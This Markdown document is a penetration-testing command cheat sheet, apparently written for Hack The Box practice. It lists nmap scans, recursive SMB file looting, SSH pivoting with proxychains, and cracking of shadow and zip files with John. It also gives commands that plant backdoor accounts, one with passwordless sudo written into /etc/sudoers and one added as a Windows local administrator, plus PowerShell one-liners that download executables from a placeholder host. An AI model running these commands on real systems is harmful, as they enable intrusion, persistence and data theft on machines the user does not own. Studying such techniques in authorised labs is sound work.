# Commands

## Kali

+ ### Shortcuts

    > **SSH**: SSH with Clear Password

    ```pwsh
    sshpass -p <Password> ssh <User>@<IP>
    ```

+ ### Enumerating

    > **NMap**: Top Scan (Fast)

    ```pwsh
    nmap -Pn -n -v -sV -sC <IP>
    ```

    > **NMap**: Full Scan with Firewall Protection (Slow)

    ```pwsh
    nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 3 --max-scan-delay 1s --defeat-rst-ratelimit --script-args unsafe=1 -oN <Output-Dir> <IP>
    ```

+ ### Remote Access

    > **Remote Desktop Connection**:

    ```pwsh
    rdesktop 0.0.0.0 -r disk:share=/Local-Path
    ```

    > **PowerShell Core**:

    ```pwsh
    > New-PSSession -Credential (Get-Credential) -ComputerName 0.0.0.0 -Authentication Negotiate
    > Enter-PSSession 1
    ```

+ ### Looting

    > **SMBClient**: Download All Files

    ```pwsh
    smbclient '\\0.0.0.0\Folder' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'User'
    ```

+ ### Compiling

    > x64 Compile

    ```pwsh
    x86_64-w64-mingw32-gcc Source.c -o File.exe
    ```

    > x86 Compile

    ```pwsh
    i686-w64-mingw32-gcc Source.c -o File.exe -lws2_32
    ```

+ ### File Transfer

    > **SCP**: Secure Copy with SSH

    ```pwsh
    scp <Source-Path> <User>@<IP>:<destination-Path>
    ```

+ ### Pivoting

    > **SShuttle**: VPN-Like Network Access

    > **Note:** Server must have python 2.3 or higher.

    ```pwsh
    sshuttle -r User@Remote-IP:Port Remote-Subnet/24
    ```

    > Dynamic with SSH & ProxyChains

    ```pwsh
    > ssh -D 12345 <User>@<IP> -p 22
    > export PROXYCHAINS_SOCKS5=12345
    > proxychains nmap -Pn -n -v -sV -sC <IP>
    ```

    > Static with SSH

    ```pwsh
    ssh -g -L 12345:localhost:<Port> <IP>
    ```

+ ### Password Cracking

    > Passwd & Shadow Files

    ```pwsh
    > unshadow passwd shadow > passwords.txt
    > john passwords.txt
    ```

    > Protected Zip Files

    ```pwsh
    > zip2john file.zip > password.txt
    > john passwords.txt
    ```

---

## Linux

+ ### Shell Helpers

    > Fixing PATH Enviroment Variable

    ```pwsh
    export PATH=$PATH:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/bin:/sbin
    ```

    > Fixing TTY

    ```pwsh
    > python -c 'import pty; pty.spawn("/bin/sh")'
    > python -c 'import pty; pty.spawn("/bin/bash")'
    ```

+ ### Process List

    > List Running Process

    ```pwsh
    > ps aux
    > ps aux | grep lfmserver
    ```

+ ### Add Local Sudoer

    > Using Sudoers File

    ```pwsh
    > adduser Hacker --force-badname
    > passwd Hacker1
    > echo 'Hacker  ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
    > su - Hacker
    > sudo bash
    ```

---

## Windows

+ ### Download File

    > Inside PowerShell

    ```pwsh
    > Invoke-WebRequest -URI http://0.0.0.0/Path -OutFile File.exe
    ```

    > Inside Command Line

    ```pwsh
    > powershell -Command "& { (New-Object Net.WebClient).DownloadFile('http://0.0.0.0/Path','File.exe') }"
    > powershell -Command "Invoke-WebRequest -URI http://0.0.0.0/Path -OutFile File.exe"

    ```

+ ### Add Local Administrator

    > Using Net.exe

    ```pwsh
    > net user Hacker Hacker1 /add
    > net localgroup administrators Hacker /add
    ```

---

## Hack The Box

+ ### Refresh Flags

    > User.txt

    ```pwsh
    gci -path c:\ -Recurse -ErrorAction SilentlyContinue -include user.txt
    ```

    > Root.txt

    ```pwsh
    gci -path c:\ -Recurse -ErrorAction SilentlyContinue -include root.txt
    ```
